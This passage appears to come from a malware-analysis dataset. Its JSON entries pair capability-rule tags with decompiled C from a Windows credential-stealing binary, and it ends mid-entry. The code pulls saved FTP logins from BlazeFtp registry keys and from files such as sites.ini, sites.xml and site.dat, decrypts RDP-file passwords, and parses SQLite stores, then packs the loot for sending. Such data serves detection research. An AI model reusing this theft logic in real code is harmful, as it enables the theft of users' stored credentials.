        "decompiled_code": "\nvoid __cdecl fcn.0040bc36(uint noname_0, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint arg_ch_00;\n    uint uVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint var_38h;\n    uint32_t var_34h;\n    uchar *var_30h;\n    uint32_t var_2ch;\n    uchar *var_28h;\n    uchar *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if ((arg_14h != 0) && (*0x414b43 != NULL)) {\n        if ((*0x418e9c < arg_14h) && ((*0x418ea0 < arg_14h && (*0x418ea4 < arg_14h)))) {\n            fcn.0040b552(arg_10h, *0x418e9c, &var_4h, &var_8h, &var_ch);\n            fcn.0040b552(arg_10h, *0x418ea4, &var_10h, &var_14h, &var_18h);\n            fcn.0040b552(arg_10h, *0x418ea0, &var_1ch, &var_20h, &var_24h);\n            var_2ch = var_1ch;\n            var_28h = var_24h;\n            var_30h = NULL;\n            iVar1 = (**0x414b43)(&var_2ch, 0, 0, 0, 0, 1, &var_34h);\n            if ((iVar1 != 0) && ((var_30h != NULL && (var_34h <= var_1ch)))) {\n                uVar3 = var_34h;\n                puVar4 = var_30h;\n                puVar5 = var_24h;\n                if (var_34h != 0) {\n                    for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                        *puVar5 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar5 = puVar5 + 1;\n                    }\n                }\n                var_1ch = var_34h;\n                fcn.0041067c(var_30h);\n                if (((var_4h != 0) && (var_10h != 0)) && (var_1ch != 0)) {\n                    arg_ch_00 = fcn.004018cf(var_4h);\n                    fcn.00401906(var_ch, arg_ch_00, var_4h);\n                    uVar2 = fcn.0041066a(0x41651c);\n                    iVar1 = fcn.00410820(arg_ch_00, 0x41651c, uVar2);\n                    if (iVar1 != 0) {\n                        uVar2 = fcn.0041066a(0x416523);\n                        iVar1 = fcn.00410820(arg_ch_00, 0x416523, uVar2);\n                    }\n                    if (iVar1 != 0) {\n                        uVar2 = fcn.0041066a(0x41652b);\n                        iVar1 = fcn.00410820(arg_ch_00, 0x41652b, uVar2);\n                    }\n                    if (iVar1 == 0) {\n                        fcn.00401569(arg_ch, 0xbeef0000);\n                        fcn.00401569(arg_ch, *0x418e98);\n                        fcn.0040159f(arg_ch, var_ch, var_4h);\n                        fcn.0040159f(arg_ch, var_18h, var_10h);\n                        fcn.0040159f(arg_ch, var_24h, var_1ch);\n                    }\n                    fcn.004018b8(arg_ch_00);\n                }\n            }\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 950
    },
    "0040be0b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040be0b(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_14h == 5) {\n        fcn.0040b552(arg_10h, 2, &var_4h, &var_8h, &var_ch);\n        if (var_8h == 1) {\n            var_10h = var_ch;\n            iVar1 = fcn.00410712(var_ch, 0x4164ec);\n            if (iVar1 == 0) {\n                fcn.0040b552(arg_10h, 0, &var_4h, &var_8h, &var_ch);\n                if (var_8h == 1) {\n                    iVar1 = fcn.004106ee(\"table\", var_ch);\n                    if (iVar1 == 0) {\n                        fcn.0040b552(arg_10h, 3, &var_4h, &var_8h, &var_ch);\n                        if (var_8h == 0) {\n                            var_14h = *var_ch;\n                            fcn.0040b552(arg_10h, 4, &var_4h, &var_8h, &var_ch);\n                            if (var_8h == 1) {\n                                *0x418e9c = -1;\n                                *0x418ea0 = -1;\n                                *0x418ea4 = -1;\n                                fcn.0040baf7(var_ch);\n                                var_18h = 1;\n                                if (((*0x418e9c != -1) && (*0x418ea0 != -1)) && (*0x418ea4 != -1)) {\n                                    fcn.0040b736(arg_8h, arg_ch, var_14h, &var_18h, fcn.0040bc36);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 499
    },
    "0040bf32": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040bf32(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t var_14h;\n    uint var_10h;\n    \n    fcn.004012bb(arg_8h);\n    iVar2 = fcn.00401133(arg_8h, &var_10h, 0x10);\n    if (iVar2 == 0) {\n        return iVar2;\n    }\n    iVar2 = fcn.0040191f(&var_10h, \"SQLite format 3\", 0x10);\n    if (iVar2 == 0) {\n        return iVar2;\n    }\n    var_14h = 1;\n    uVar3 = fcn.00401390(arg_8h, &var_14h);\n    if ((uVar3 == 0) || (var_14h == 0)) {\n        return 0;\n    }\n    iVar2 = 0;\n    uVar4 = uVar3;\n    while (uVar4 != 0) {\n        uVar1 = uVar4 & 1;\n        uVar4 = uVar4 >> 1;\n        if (uVar1 != 0) {\n            iVar2 = iVar2 + 1;\n        }\n    }\n    if (uVar3 == 1) {\n        uVar3 = 0x10000;\n    }\n    if (iVar2 != 1) {\n        return 0;\n    }\n    *0x418e94 = uVar3;\n    iVar2 = fcn.004013bd(arg_8h, &var_14h);\n    if (((iVar2 != 1) && (iVar2 != 2)) || (var_14h == 0)) {\n        return 0;\n    }\n    iVar2 = fcn.004013bd(arg_8h, &var_14h);\n    if (((iVar2 != 1) && (iVar2 != 2)) || (var_14h == 0)) {\n        return 0;\n    }\n    iVar2 = fcn.004013bd(arg_8h, &var_14h);\n    if ((iVar2 != 0) || (var_14h == 0)) {\n        return 0;\n    }\n    iVar2 = fcn.004013bd(arg_8h, &var_14h);\n    if ((iVar2 != 0x40) || (var_14h == 0)) {\n        return 0;\n    }\n    iVar2 = fcn.004013bd(arg_8h, &var_14h);\n    if ((iVar2 != 0x20) || (var_14h == 0)) {\n        return 0;\n    }\n    iVar2 = fcn.004013bd(arg_8h, &var_14h);\n    if ((iVar2 == 0x20) && (var_14h != 0)) {\n        fcn.004013e8(arg_8h, 0x20, &var_14h);\n        uVar3 = fcn.00401364(arg_8h, &var_14h);\n        if (((uVar3 != 0) && (uVar3 < 4)) && (var_14h != 0)) {\n            *0x418e98 = uVar3;\n            fcn.004013e8(arg_8h, 0x28, &var_14h);\n            iVar2 = fcn.0040b736(arg_8h, arg_ch, 1, &var_14h, fcn.0040be0b);\n            return iVar2;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 832
    },
    "0040c3af": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c3af(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    int32_t arg_ch_00;\n    char *pcVar3;\n    char *arg_8h_00;\n    uint arg_8h_01;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x39, 0);\n    cVar1 = **0x4147ed;\n    arg_8h_00 = *0x4147ed;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if ((iVar2 != 0) && (iVar2 = fcn.0040242b(arg_8h_00),  iVar2 != 0)) {\n            fcn.0040c37f(arg_8h, 0x1a, iVar2);\n            fcn.0040c37f(arg_8h, 0x1c, iVar2);\n            fcn.0040c37f(arg_8h, 0x23, iVar2);\n            arg_ch_00 = fcn.00401df8(iVar2, 0x4165b1);\n            if (arg_ch_00 != 0) {\n                arg_8h_01 = arg_8h;\n                fcn.00409ac1(arg_8h, arg_ch_00, iVar2);\n                fcn.004018b8(arg_8h_01);\n            }\n            fcn.004018b8(iVar2);\n        }\n        iVar2 = -1;\n        pcVar3 = arg_8h_00;\n        do {\n            arg_8h_00 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            arg_8h_00 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = arg_8h_00;\n        } while (cVar1 != '\\0');\n        cVar1 = *arg_8h_00;\n    } while( true );\n}\n",
        "token_count": 512
    },
    "0040c48c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c48c(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    char *pcVar3;\n    char *arg_8h_00;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x3a, 0);\n    cVar1 = **0x4147ed;\n    arg_8h_00 = *0x4147ed;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if ((iVar2 != 0) && (iVar2 = fcn.0040242b(arg_8h_00),  iVar2 != 0)) {\n            fcn.0040c45c(arg_8h, 0x1a, iVar2);\n            fcn.0040c45c(arg_8h, 0x1c, iVar2);\n            fcn.0040c45c(arg_8h, 0x23, iVar2);\n            fcn.004018b8(iVar2);\n        }\n        iVar2 = -1;\n        pcVar3 = arg_8h_00;\n        do {\n            arg_8h_00 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            arg_8h_00 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = arg_8h_00;\n        } while (cVar1 != '\\0');\n        cVar1 = *arg_8h_00;\n    } while( true );\n}\n",
        "token_count": 407
    },
    "0040c516": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c516(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    char *pcVar3;\n    char *arg_8h_00;\n    uint arg_8h_01;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x3b, 0);\n    cVar1 = **0x4147ed;\n    arg_8h_00 = *0x4147ed;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if ((iVar2 != 0) && (iVar2 = fcn.0040242b(arg_8h_00),  iVar2 != 0)) {\n            arg_8h_01 = arg_8h;\n            fcn.00404351(arg_8h, iVar2, 0x4165d5, 0xbeef0000);\n            fcn.004018b8(arg_8h_01);\n        }\n        iVar2 = -1;\n        pcVar3 = arg_8h_00;\n        do {\n            arg_8h_00 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            arg_8h_00 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = arg_8h_00;\n        } while (cVar1 != '\\0');\n        cVar1 = *arg_8h_00;\n    } while( true );\n}\n",
        "token_count": 386
    },
    "0040c587": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c587(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_ch_00;\n    int32_t iVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x414afb == NULL) {\n        return;\n    }\n    var_8h = fcn.00410766(0, 0, arg_ch, 0xffffffff, 0, 0);\n    var_4h = fcn.004018cf(var_8h);\n    fcn.00410766(0, 0, arg_ch, 0xffffffff, var_4h, var_8h);\n    iVar1 = (**0x414afb)(var_4h, 0, 0x12, 0, 0, &var_ch);\n    if (-1 < iVar1) {\n        iVar1 = (**(*var_ch + 0x10))(var_ch, L\"Settings\", 0, 0x12, 0, &var_10h);\n        if (-1 < iVar1) {\n            iVar1 = fcn.00401082(var_10h);\n            if (iVar1 != 0) {\n                arg_ch_00 = fcn.004018cf(iVar1);\n                fcn.004012bb(var_10h);\n                iVar2 = fcn.00401133(var_10h, arg_ch_00, iVar1);\n                if (iVar2 != 0) {\n                    fcn.00401569(arg_8h, 0xbeef0000);\n                    fcn.0040159f(arg_8h, arg_ch_00, iVar1);\n                }\n                fcn.004018b8(arg_ch_00);\n            }\n            fcn.00401021(var_10h);\n        }\n        (**(*var_ch + 8))(var_ch);\n    }\n    fcn.004018b8(var_4h);\n    return;\n}\n",
        "token_count": 458
    },
    "0040c7ab": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c7ab(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    char *pcVar3;\n    char *arg_8h_00;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x3e, 0);\n    cVar1 = **0x4147ed;\n    arg_8h_00 = *0x4147ed;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if ((iVar2 != 0) && (iVar2 = fcn.0040242b(arg_8h_00),  iVar2 != 0)) {\n            fcn.00404351(arg_8h, iVar2, \".SMF\", 0xbeef0000);\n            fcn.004018b8(iVar2);\n        }\n        iVar2 = -1;\n        pcVar3 = arg_8h_00;\n        do {\n            arg_8h_00 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            arg_8h_00 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = arg_8h_00;\n        } while (cVar1 != '\\0');\n        cVar1 = *arg_8h_00;\n    } while( true );\n}\n",
        "token_count": 365
    },
    "0040c823": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c823(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *arg_8h_00;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = fcn.004015f0(arg_8h, 0x3f, 0);\n    cVar1 = **0x4147ed;\n    arg_8h_00 = *0x4147ed;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.0040439c(arg_8h, \"\\\\BlazeFtp\", \"site.dat\", 0xbeef0000);\n            var_14h = fcn.00401d71(*0x414869, \"Software\\\\FlashPeak\\\\BlazeFtp\\\\Settings\", \"LastPassword\", 0);\n            var_ch = fcn.00401d71(*0x414869, \"Software\\\\FlashPeak\\\\BlazeFtp\\\\Settings\", \"LastAddress\", 0);\n            var_10h = fcn.00401d71(*0x414869, \"Software\\\\FlashPeak\\\\BlazeFtp\\\\Settings\", \"LastUser\", 0);\n            var_18h = fcn.00401d71(*0x414869, \"Software\\\\FlashPeak\\\\BlazeFtp\\\\Settings\", \"LastPort\", &var_1ch);\n            if (((var_ch != 0) && (var_10h != 0)) && (var_14h != 0)) {\n                fcn.00401569(arg_8h, 0xbeef0001);\n                fcn.004015cb(arg_8h, var_ch);\n                fcn.004015cb(arg_8h, var_10h);\n                fcn.004015cb(arg_8h, var_14h);\n                fcn.0040159f(arg_8h, var_18h, var_1ch);\n            }\n            fcn.004018b8(var_14h);\n            fcn.004018b8(var_ch);\n            fcn.004018b8(var_10h);\n            fcn.004018b8(var_18h);\n            fcn.00401636(arg_8h, var_4h);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if ((iVar2 != 0) && (iVar2 = fcn.0040242b(arg_8h_00),  iVar2 != 0)) {\n            var_8h = iVar2;\n            fcn.00404351(arg_8h, iVar2, \"site.dat\", 0xbeef0000);\n            fcn.004018b8(var_8h);\n        }\n        iVar2 = -1;\n        pcVar3 = arg_8h_00;\n        do {\n            arg_8h_00 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            arg_8h_00 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = arg_8h_00;\n        } while (cVar1 != '\\0');\n        cVar1 = *arg_8h_00;\n    } while( true );\n}\n",
        "token_count": 774
    },
    "0040c9e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c9e8(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    char *pcVar3;\n    char *arg_8h_00;\n    uint arg_8h_01;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x41, 0);\n    cVar1 = **0x4147ed;\n    arg_8h_00 = *0x4147ed;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if ((iVar2 != 0) && (iVar2 = fcn.0040242b(arg_8h_00),  iVar2 != 0)) {\n            arg_8h_01 = arg_8h;\n            fcn.00404351(arg_8h, iVar2, \"Connections.txt\", 0xbeef0000);\n            fcn.004018b8(arg_8h_01);\n        }\n        iVar2 = -1;\n        pcVar3 = arg_8h_00;\n        do {\n            arg_8h_00 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            arg_8h_00 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = arg_8h_00;\n        } while (cVar1 != '\\0');\n        cVar1 = *arg_8h_00;\n    } while( true );\n}\n",
        "token_count": 383
    },
    "0040ca59": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ca59(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint uVar3;\n    char *pcVar4;\n    char *arg_8h_00;\n    uint uVar5;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x42, 0);\n    cVar1 = **0x4147ed;\n    arg_8h_00 = *0x4147ed;\n    do {\n        if (cVar1 == '\\0') {\n            iVar2 = fcn.00401eb1(0x23);\n            if (iVar2 != 0) {\n                uVar3 = fcn.00401e4c(iVar2, \"\\\\3D-FTP\");\n                uVar5 = arg_8h;\n                fcn.00404351(arg_8h, uVar3, \"sites.ini\", 0xbeef0000);\n                fcn.004018b8(uVar5);\n            }\n            iVar2 = fcn.00401eb1(0x23);\n            if (iVar2 != 0) {\n                uVar3 = fcn.00401e4c(iVar2, \"\\\\SiteDesigner\");\n                uVar5 = arg_8h;\n                fcn.00404351(arg_8h, uVar3, \"sites.ini\", 0xbeef0000);\n                fcn.004018b8(uVar5);\n            }\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if ((iVar2 != 0) && (iVar2 = fcn.0040242b(arg_8h_00),  iVar2 != 0)) {\n            uVar5 = arg_8h;\n            fcn.00404351(arg_8h, iVar2, \"sites.ini\", 0xbeef0000);\n            fcn.004018b8(uVar5);\n        }\n        iVar2 = -1;\n        pcVar4 = arg_8h_00;\n        do {\n            arg_8h_00 = pcVar4;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            arg_8h_00 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar4 = arg_8h_00;\n        } while (cVar1 != '\\0');\n        cVar1 = *arg_8h_00;\n    } while( true );\n}\n",
        "token_count": 576
    },
    "0040cb28": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cb28(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    int16_t *var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = fcn.00401ffd(arg_ch, &var_10h);\n    if (iVar1 != 0) {\n        if ((2 < var_4h) && (*var_8h == 0x222c)) {\n            fcn.00401569(arg_8h, arg_10h);\n            fcn.0040159f(arg_8h, var_8h, var_4h);\n        }\n        fcn.00402091(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "0040ccda": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ccda(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    if (((*0x414b0f != NULL) && (*0x414b0b != NULL)) && (*0x414b43 != 0)) {\n        var_4h = NULL;\n        var_8h = 0;\n        iVar1 = (**0x414b0b)(0x41676a, 0, &var_8h, &var_4h);\n        if (((iVar1 != 0) && (var_8h != 0)) && (piVar2 = var_4h,  var_4h != NULL)) {\n            while ((var_8h != 0 && (*piVar2 != 0))) {\n                iVar1 = *piVar2;\n                iVar3 = arg_8h;\n                fcn.0040cc29(arg_8h, *(iVar1 + 0x30), *(iVar1 + 8), *(iVar1 + 0x1c), *(iVar1 + 0x18));\n                var_8h = var_8h + -1;\n                piVar2 = iVar3 + 4;\n            }\n            (**0x414b0f)(var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 323
    },
    "0040cd6b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cd6b(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char *arg_8h_00;\n    char *pcVar3;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    iVar1 = fcn.004106e2(0, 0, arg_ch, arg_10h >> 1, 0, 0, 0, 0);\n    if (iVar1 != 0) {\n        iVar2 = iVar1;\n        var_8h = fcn.004018cf(iVar1);\n        iVar1 = fcn.004106e2(0, 0, arg_ch, arg_10h >> 1, var_8h, iVar1, 0, 0, iVar2);\n        if (iVar1 == 0) {\n            fcn.004018b8(var_8h);\n            var_8h = 0;\n        }\n    }\n    if ((var_8h != 0) && (iVar1 = fcn.00410808(var_8h, arg_8h),  iVar1 != 0)) {\n        iVar2 = fcn.0041066a(arg_8h, iVar1);\n        arg_8h_00 = iVar2 + arg_8h;\n        for (pcVar3 = arg_8h_00; *pcVar3 != '\\0'; pcVar3 = pcVar3 + 1) {\n            if (*pcVar3 == '\\r') {\n                *pcVar3 = '\\0';\n                iVar1 = fcn.0041066a(arg_8h_00, iVar1);\n                if (iVar1 != 0) {\n                    var_ch = fcn.004018cf(iVar1);\n                    fcn.00401906(arg_8h_00, var_ch, iVar1);\n                }\n                break;\n            }\n        }\n    }\n    fcn.004018b8(var_8h);\n    return var_ch;\n}\n",
        "token_count": 480
    },
    "0040ce3d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ce3d(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    uint var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    uint16_t *var_20h;\n    int32_t var_1ch;\n    uint16_t *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if (*0x414b43 == NULL) {\n        return;\n    }\n    iVar3 = fcn.00401ffd(arg_ch, &var_10h);\n    if (iVar3 != 0) {\n        if (var_4h < 0x100000) {\n            iVar3 = fcn.004023a8(var_8h, var_4h);\n            if (iVar3 == 0) {\n                var_14h = fcn.0040cd6b(\"username:s:\", var_8h, var_4h);\n                var_18h = fcn.0040cd6b(\"password 51:b:\", var_8h, var_4h);\n                var_1ch = fcn.0040cd6b(\"full address:s:\", var_8h, var_4h);\n                if (((var_14h != 0) && (var_18h != NULL)) && (var_1ch != 0)) {\n                    var_24h = fcn.0041066a(var_18h);\n                    var_24h = var_24h >> 1;\n                    puVar5 = var_18h;\n                    puVar6 = var_18h;\n                    for (uVar4 = var_24h; uVar4 != 0; uVar4 = uVar4 - 1) {\n                        uVar2 = *puVar5;\n                        uVar1 = uVar2;\n                        if ((uVar1 < 0x30) || (0x39 < uVar1)) {\n                            uVar2 = uVar2 & 0xff00 | uVar1 - 0x37;\n                        }\n                        else {\n                            uVar2 = uVar2 & 0xff00 | uVar1 - 0x30;\n                        }\n                        uVar1 = uVar2 >> 8;\n                        if ((uVar1 < 0x30) || (0x39 < uVar1)) {\n                            uVar2 = uVar2 & 0xff | uVar1 - 0x37 << 8;\n                        }\n                        else {\n                            uVar2 = uVar2 & 0xff | uVar1 - 0x30 << 8;\n                        }\n                        *puVar6 = uVar2 << 4 | uVar2 >> 8;\n                        puVar5 = puVar5 + 1;\n                        puVar6 = puVar6 + 1;\n                    }\n                    var_20h = var_18h;\n                    var_28h = 0;\n                    iVar3 = (**0x414b43)(&var_24h, 0, 0, 0, 0, 1, &var_2ch);\n                    if ((iVar3 != 0) && (var_28h != 0)) {\n                        fcn.0040cc29(arg_8h, var_14h, var_1ch, var_28h, var_2ch);\n                        fcn.0041067c();\n                    }\n                }\n                fcn.004018b8(var_14h);\n                fcn.004018b8(var_18h);\n                fcn.004018b8(var_1ch);\n            }\n        }\n        fcn.00402091(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 871
    },
    "0040cff0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cff0(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    char *pcVar3;\n    char *arg_8h_00;\n    uint arg_8h_01;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x46, 0);\n    cVar1 = **0x4147ed;\n    arg_8h_00 = *0x4147ed;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if (((iVar2 != 0) || (iVar2 = fcn.00410808(),  iVar2 != 0)) && (iVar2 = fcn.0040242b(arg_8h_00),  iVar2 != 0)) {\n            arg_8h_01 = arg_8h;\n            fcn.00404351(arg_8h, iVar2, \"sites.xml\", 0xbeef0000);\n            fcn.004018b8(arg_8h_01);\n        }\n        iVar2 = -1;\n        pcVar3 = arg_8h_00;\n        do {\n            arg_8h_00 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            arg_8h_00 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = arg_8h_00;\n        } while (cVar1 != '\\0');\n        cVar1 = *arg_8h_00;\n    } while( true );\n}\n",
        "token_count": 400
    },
    "0040d072": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
